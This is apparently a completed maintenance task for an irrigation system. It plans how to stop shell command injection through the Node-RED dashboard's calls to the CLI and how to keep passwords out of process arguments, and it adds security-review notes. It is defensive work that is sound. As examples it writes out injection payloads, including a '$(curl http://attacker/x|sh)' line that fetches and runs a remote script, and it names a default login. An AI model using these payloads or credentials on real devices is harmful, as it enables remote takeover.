---
status: done
priority: critical
type: maintenance
---

## Title

Harden Node-RED → CLI invocation against shell command injection and secret exposure

## Specification

Eliminate the command-injection and secret-in-process-arguments vulnerabilities in
the path that connects the Node-RED dashboard to the `irrigation` CLI. Untrusted
input entered in the dashboard (valve/section names, schedule times, weekdays,
history dates, usernames, passwords) must never be interpreted by a shell, and
secrets must never appear on a process command line.

### Context

The dashboard drives the system exclusively through Node-RED `exec` nodes that call
`/opt/irrigation/bin/irrigation`. Every one of the 13 `exec` nodes is configured
with `useSpawn: false` and `addpay: true`:

- `useSpawn: false` makes Node-RED run the command with `child_process.exec`, i.e.
  through `/bin/sh -c "<command> <payload>"`.
- `addpay: true` appends `msg.payload` (built from user input by the "Formata …"
  function nodes) directly onto that shell string.

The function nodes only guard against commas (to protect the CSV parsing of the CLI)
and, for some fields, do not validate at all (schedule `time`, `weekdays`, history
`start_date`/`end_date`). Shell metacharacters (`; | & $() \` > < *` and spaces) are
never neutralized. Any authenticated dashboard user — or an attacker leveraging CSRF
/ a stored value — can therefore execute arbitrary commands as the Node-RED user on
the Raspberry Pi.

Examples of injecting payloads that reach `/bin/sh -c`:

- History search: `end_date = "2026-01-01;reboot"` →
  `irrigation history range,2026-01-01,2026-01-01;reboot`.
- Section name: `garden$(curl http://attacker/x|sh)` (no comma, passes the guard).

Additionally, `auth login` and `auth change-password` receive the username and
password as CLI arguments. On Linux these are world-readable via
`/proc/<pid>/cmdline` and `ps`, and here they are also embedded in the shell command
string. Passwords must not be passed as argv.

This is the highest-severity issue found in a broader security review (see Notes for
the full audit, including confirmation that **SQL injection is not currently
present** and a list of access/performance follow-ups).

### Scope

#### In scope

- Remove shell interpretation of untrusted input for all Node-RED `exec` calls to the
  CLI (schedule create/update/delete/enabled/list, valve manual on/off,
  valve add/update/delete, history search, health).
- Stop passing credentials (`auth login`, `auth change-password`) as process
  arguments; deliver them to the CLI through a non-argv channel (stdin).
- Add a safe input channel to the CLI (accept the command payload via stdin) so
  Node-RED can pass structured, non-shell-interpreted data.
- Preserve current dashboard behavior and JSON responses exactly.

#### Out of scope (create separate follow-up tasks — see Notes)

- Session store hardening (server-side expiry, eviction, rotation).
- TLS termination and `Secure` cookie flag.
- Login rate-limiting / lockout.
- Default-credential policy (`admin/10203040`, `reset-to-default`) and forced change.
- Binding Node-RED admin/editor to localhost and reviewing `permissions: "*"`.
- History retention/pruning and O(N) history scans in the controller loop.

## Impact analysis

### Files to inspect

- `node-red/flows.json` — all `exec` nodes (`useSpawn`, `addpay`) and the "Formata …"
  function nodes that build each `msg.payload`.
- `node-red/settings.js` — `verifyCredentials` already uses `execFile` (argv, no
  shell) but still passes the password as an argument; `adminAuth.authenticate`
  shares it.
- `src/irrigation/cli.py` — argument parsing (`_csv`) and command dispatch; entry
  point for a new stdin input path.
- `src/irrigation/application/services.py` — `AuthService.verify` /
  `change_password` signatures (unchanged behavior, only input source changes).
- `scripts/sync_flows_templates.py` and `node-red/templates/*.html` — confirm the
  templates only post structured fields; regenerate flows if generated.
- `tests/test_cli.py`, `tests/test_node_red_flow.py`, `tests/test_node_red_settings.py`
  — existing coverage and where to add regression tests.

### Files to change

- `node-red/flows.json` — switch CLI `exec` nodes to a non-shell invocation
  (spawn/argv, no shell metacharacter interpretation) and pass untrusted payloads
  through the safe channel; feed credentials via stdin rather than argv/appended
  command string.
- `src/irrigation/cli.py` — add a stdin-based input mode for command payloads and
  secrets; keep existing argv behavior for non-secret, non-untrusted invocations or
  route everything through the safe path.
- `node-red/settings.js` — pass credentials to the CLI via stdin instead of as an
  `execFile` argument.
- `tests/*` — add/adjust specs (see Test specification).

### Files to create

- Possibly `src/irrigation/io.py` (or a small helper in `cli.py`) — read/parse the
  stdin payload. Only if it represents a clear single responsibility.

### Dependencies and integration points

- Node-RED `exec` node semantics (spawn vs exec; how appended payload is passed).
- The `IRRIGATION_BINARY` env indirection in `settings.js`.
- systemd unit (`deploy/systemd/irrigation.service.template`) — no change expected;
  confirm the CLI still starts the same way.

## Technical approach

### Design principles

- Keep each class and function focused on one responsibility.
- Depend on abstractions at architectural boundaries.
- Keep domain rules independent from infrastructure details.
- Prefer small, explicit interfaces and simple data flows.
- Avoid speculative abstractions, duplicated logic, and unrelated changes.

### Proposed changes

1. Give the CLI a shell-free input path: accept the command payload (and secrets)
   on **stdin** — for example a single line, or a small JSON object per command —
   instead of relying on a comma-joined argv string. Validate/parse it with the
   same domain services already in place. This removes any dependency on shell
   quoting and keeps secrets out of argv.
2. Reconfigure the Node-RED CLI `exec` nodes so untrusted input is not interpreted
   by a shell: run without a shell (spawn) and deliver the user payload through the
   stdin channel from step 1 rather than appending it to the command line
   (`addpay`). Remove the now-unnecessary comma guards, or keep them only as UX
   validation, not as a security control.
3. In `settings.js`, send `username`/`password` to the CLI on stdin (keep
   `execFile`, drop the credentials from `args`). Apply the same to
   `adminAuth.authenticate`.
4. If `flows.json` is generated by `scripts/sync_flows_templates.py`, update the
   generator/templates and regenerate; otherwise edit `flows.json` directly and keep
   `test_node_red_flow.py` assertions in sync.
5. Add regression tests that prove metacharacter payloads are treated as data, and
   that credentials never appear in argv.

### Performance considerations

- Expected input size: tiny (single command payloads, a few fields each).
- Expected complexity: `O(1)` per invocation; no change to hot paths.
- Performance risks: none introduced; spawning Python per request is a pre-existing
  cost tracked separately (see Notes / performance follow-up).
- Mitigation: not needed for this task.

### Error handling and edge cases

- Section names, times, and dates containing shell metacharacters, quotes, spaces,
  newlines, and Unicode must round-trip as literal data.
- Empty/oversized stdin payloads must be rejected cleanly (mirror the existing 4 KB
  login-body cap intent).
- Malformed JSON / missing fields → existing `Error: …` exit code 2 behavior.
- Confirm behavior when `msg.payload` is empty for list/health commands.
- A section name equal to a valid flag (e.g. `--no-wait`) must not be parsed as an
  option (argv injection); routing untrusted data via stdin prevents this.

## Test specification

### Unit tests

- [x] CLI accepts a payload via stdin and produces the same result as the current
      argv form for schedule/valve/history/auth commands.
- [x] CLI treats shell metacharacters (`;`, `$( )`, backticks, `|`, `&`, spaces,
      newlines) in section names and dates as literal data.
- [x] `AuthService` path reads credentials from stdin; password never appears in
      `sys.argv`.

### Integration tests

- [x] `test_node_red_flow.py`: every CLI invocation is configured for a shell-free
      invocation (no shell metacharacter interpretation) and no untrusted field is
      appended to a shell command line.
- [x] `test_node_red_settings.py`: `verifyCredentials` / `adminAuth.authenticate`
      pass credentials via stdin, not as `execFile` arguments or an appended command.

### Regression tests

- [x] Creating a section named `front; touch /tmp/pwned` does not execute a shell
      command and is stored/echoed as the literal string (or rejected by validation).
- [x] History search with an injected date does not run extra commands.
- [x] All previously passing dashboard flows still return identical JSON.

### Test data and fixtures

- Reuse the in-memory / temp SQLite fixtures from `tests/test_cli.py` and
  `tests/test_sqlite_repository.py`.
- A sentinel side-effect file path to prove no injected command runs.

## Acceptance criteria

The task is complete when:

- [x] No Node-RED `exec` call to the CLI interprets untrusted input through a shell.
- [x] Credentials are never passed as process arguments (not in argv, not in an
      appended shell string); they travel via stdin.
- [x] Existing dashboard behavior and JSON responses are unchanged.
- [x] Injection attempts through section names, schedule times, weekdays, and
      history dates are proven inert by tests.
- [x] The implementation follows the project's architecture and SOLID principles.
- [x] Formatting, linting, type checks, and the full test suite pass.
- [x] `README.md` / `docs/DEVELOPER_GUIDE.md` note the stdin invocation contract.

## Implementation checklist

- [x] Confirm the task number and filename.
- [x] Inspect all files listed in the impact analysis.
- [x] Reassess the affected files before coding and update this task if needed.
- [x] Implement the smallest coherent change (stdin input path + flow/settings
      rewiring).
- [x] Add or update specs.
- [x] Run focused checks.
- [x] Run the full validation suite.
- [x] Validate the implementation against every acceptance criterion.
- [x] Move the issue to `done` only after implementation and validation pass.

## Notes

Full security review of the current branch (2026-07-18):

- **SQL injection — not present (verified).** `sqlite_repository.py` binds all values
  with `?` placeholders. Table and column names are interpolated into f-strings but
  come only from the fixed `_TABLE_COLUMNS` whitelist / hard-coded column tuples,
  never from user input; `find_by_date_range` also binds parameters. Keep this
  invariant: never interpolate a caller-supplied identifier into SQL.

- **Command injection — critical (this task).** All `exec` nodes use
  `useSpawn: false` + `addpay: true`, running user input through `/bin/sh -c`.

- **Secrets in argv — high (this task).** `auth login` / `auth change-password`
  receive credentials as CLI arguments (visible via `ps` / `/proc`).

Access-control and performance findings to file as separate tasks:

- Session store is an in-memory `Set` with no server-side expiry or eviction; a
  stolen token is valid until Node-RED restarts. Add TTL + rotation.
- No TLS and cookie lacks `Secure`; credentials cross the LAN in cleartext. Add
  TLS / reverse proxy and set `Secure` when served over HTTPS.
- No login rate-limiting or lockout; the weak known default `admin/10203040` (and
  `auth reset-to-default`) makes brute force cheap. Add throttling + forced change
  of the default password on first login.
- Node-RED `adminAuth` grants `permissions: "*"`; editing flows is RCE by design.
  Bind the admin/editor to localhost and review whether it should ship enabled.
- `history` table has no retention/pruning; `HistoryService.has_active_manual` /
  `has_active_automatic` load and scan **all** rows in Python on every controller
  poll (per schedule). On a Pi this is a growing CPU/memory/SD-wear DoS. Add a
  retention policy and push the active-interval lookup into an indexed SQL query.
- Each dashboard action spawns a fresh Python process that opens the DB and runs the
  schema; consider a longer-lived worker if latency/SD wear becomes a problem.
</content>
